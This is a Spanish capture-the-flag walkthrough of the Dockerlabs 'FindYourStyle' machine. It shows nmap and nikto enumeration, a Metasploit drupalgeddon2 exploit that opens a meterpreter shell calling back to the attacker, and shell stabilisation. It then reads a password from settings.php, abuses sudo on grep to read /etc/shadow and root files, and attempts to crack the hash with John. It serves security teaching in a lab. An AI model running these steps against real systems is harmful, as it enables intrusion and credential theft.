# Máquina FindYourStyle

Dificultad -> Fácil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

**Imprescindible tener instalado Docker**. Docker te permite ejecutar programas de forma aislada y portátil, como si cada programa tuviera su propio mini-ordenador dentro de tu PC.

## Despliegue del laboratorio
 Una vez descargada la máquina, debemos realizar los siguientes pasos para tener acceso a la máquina:
 
 En primer lugar veremos que tenemos descargado un zip con dos archivos un .sh y un .tar.
 
 ### Archivos
 
.sh → Script de Linux con comandos. Se ejecuta en la terminal.

.tar → Archivo que agrupa otros archivos/carpe
tas.

Para el despliegue de la máquina tendremos que ejecutar el siguiente comando:
```shell
sudo bash auto_deploy.sh findyourstyle.tar
```

Como siempre empezamos escaneando la máquina:
```bash
nmap -sCV -p- --open --min-rate 5000 172.17.0.2 -vvv
```
Tras el escaneo encontramos solo el puerto 80 http abierto:


<img width="777" height="315" alt="imagen" src="https://github.com/user-attachments/assets/603bc931-875d-493c-95ce-5d4cddc598a3" />

Aquí encontramos cierta info relevante. Varias rutas interesantes que podemos explorar. Primero echaremos un vistazo a la web. Lo que si sabemos es que utiliza php y Apache 

<img width="1540" height="469" alt="imagen" src="https://github.com/user-attachments/assets/dfbaa254-765f-41cf-83e2-89160cddf016" />

La web no contiene nada interesante. El vector de ataque no está en la propia interfaz sino e algún de sus rutas. Vamos a ojear algunas de ellas como algún panel de login, el readme, el robots.txt etc.:

-Robots.txt:

<img width="468" height="747" alt="imagen" src="https://github.com/user-attachments/assets/eba6ec09-47e7-46be-bf85-9f1f66262faf" />

Muestra ciertas rutas de la web interesantes. Probamos a entrar a /admin y probar credenciales de admin por defecto. En este caso no funcionaron. Podemos ver más rutas como `index.php` o `web.config`. De `index.php` no encontramos nada interesante, pero de `web.config` encontramos un XML que nos indica que la web usa PHP y `index.php` es el archivo principal. La regla:
```xml
<match url="\.(engine|inc|install|module|profile|po|sh|.*sql|theme|twig|tpl(\.php)?|xtmpl|yml|svn-base)$|^(code-style\.pl|Entries.*|Repository|Root|Tag|Template|all-wcprops|entries|format|composer\.(json|lock))$"/>
```
indica que el servidor bloquea el acceso directo a determinados archivos sensibles, como:
```xml
*.sql
*.yml
composer.json
composer.lock
*.inc
*.sh
```
Esto huele bastante a Drupal, de hecho aparecen extensiones y nombres típicos de Drupal:
```xml
.module
.theme
.profile
.twig
```

Tras leer el README confirmamos que la web usa Drupal. Drupal es un CMS, un sistema de gestión de contenidos. Posee una interfaz desde la que se gestiona la web con sus archivos, plugins y configuraciones. Hay herramientas típicas para enumerar un drupal. Vamos a enumera drupal para ver si encontramos usuarios o algo por el estilo. Tenemos ciertas rutas a las que podemos acceder si encontramos credenciales:
```bash
nikto -h http://172.17.0.2
whatweb http://172.17.0.2
```
Información relevante:

CMS: Drupal 8

Servidor: Apache 2.4.25 sobre Debian

PHP: 7.2.3

Ruta interesante: `/core/CHANGELOG.txt` que revela la versión de Drupal.


Vemos que usa la versión 8 de Drupal. Tras buscarla en Searchsploit encontramos vulnerabilidades de la versión 8 de para obtener una shell y que usa Metasploit:
<img width="1370" height="776" alt="imagen" src="https://github.com/user-attachments/assets/482d43b9-cc18-4701-8d80-bce5a7d8c5d3" />


Por tanto vamos a buscar eso en Metasploit:
```bash
msfconsole
search drupalgeddon2
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 172.17.0.2
set TARGETURI /
set LHOST 172.17.0.1
run
```

Nos entra en una sesión de meterpreter, es decir, conseguimos acceder al servidor de Drupal:
<img width="1309" height="205" alt="imagen" src="https://github.com/user-attachments/assets/1907546d-3c52-445c-ad22-35ed67b16d38" />


Vamos a enumerar el servidor:
```meterpreter
getuid    # www-data
sysinfo   # Linux 
pwd
shell
```

Obtenemos mejor una shell. Aquí podemos escribir mejor comandos de Linux. Vamos a estabilizar la sesión para obtener un bin bash:

1. Dentro de shell

Prueba:
```bash
script /dev/null -c bash
```
Comprueba:
```bash
whoami
tty
```
Si tty devuelve algo como:
```
/dev/pts/0
```
ya tienes una TTY.

2. Si script no funciona

Puedes probar:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
o, si no existe python3:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Después:
```
export TERM=xterm
export SHELL=bash
```

**Escalada de privilegios**

Por último nos queda escalar privilegios en el servidor. Tras inspeccionar para escalar privs no encontré nada relevante. Lo que si encontré fue un usuario `ballenita` con una /bin/bash:

```bash
www-data@2bd16f937e63:/var/www/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
```

Por tanto deberemos de intentar acceder a él de alguna forma. Podríamos probar fuerza bruta en los logins de drupal. Antes de nada deberíamos seguri revsiando la máquina. Nosqueda por mirar el `settings.php`:
```bash
cat /sites/default/settings.php
```

En este archivo tras revisarlo con calma nos encontramos la password de ballenita!!:
<img width="1584" height="353" alt="imagen" src="https://github.com/user-attachments/assets/c1fde1f5-5df2-4644-b33f-b15abc592b9b" />

Accedemos a ballenita:
```bash
su ballenita
```

Ahora somos ballenita. Intentamos escalar privilegios desde aquí:
```bash
sudo -l
```

Encontramos esto:
<img width="1313" height="206" alt="imagen" src="https://github.com/user-attachments/assets/03196c3f-3a3c-4178-a8f9-453dc7a43497" />

Estos binarios no nos permiten acceder a una shell de root, pero si que nos pueden permitir para leer archivos que solo root puede leer:
```bash
sudo /bin/grep '' /etc/shadow
```
El archivo /etc/shadow contiene los hashes de las passwords de los users. Usaremos el hash obtenido de root para descifrar su password:

<img width="1582" height="99" alt="imagen" src="https://github.com/user-attachments/assets/dfe30c4a-ff92-4795-b84d-920a4dc0ee4a" />

Un hash que empieza por $6$ utiliza el algoritmo SHA-512 Crypt. He probado John The Ripper a ver si sacaba la password:
```bash
nano hash.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Pero tras bastante rato no encontró nada. Podemos seguir mirando ficheros de root con los permisos dee ls y grep, y encontramos lo siguiente:
```bash
sudo /bin/ls -la /root
```

<img width="974" height="288" alt="imagen" src="https://github.com/user-attachments/assets/a287fa40-f4b1-43b7-b019-76eec8909056" />

Vemos un archivo que puede ser la password: `secretitomaximo.txt`. Para leerlo:
```bash
sudo /bin/grep '' /root/secretitomaximo.txt
```

<img width="1180" height="216" alt="imagen" src="https://github.com/user-attachments/assets/8d05f536-e0ed-497e-a0ad-b888c4ee8a30" />

Hemos alcanzado privilegios máximos en el sistema!




